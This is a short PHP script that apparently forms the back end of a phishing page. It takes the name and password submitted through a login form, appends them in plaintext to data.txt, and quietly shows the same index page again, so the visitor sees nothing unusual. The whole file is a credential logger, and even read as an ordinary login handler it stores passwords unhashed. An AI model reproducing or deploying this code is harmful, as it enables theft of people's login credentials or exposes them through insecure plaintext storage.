<?php
if(isset($_POST["name"]) && isset($_POST["password"])){
    $f=fopen("data.txt","a");
	$data = $_POST["name"].";".$_POST["password"]."\r\n";
	fwrite($f,$data);
    fclose($f);
	include 'index.php';
}else{
    include 'index.php';
}
?>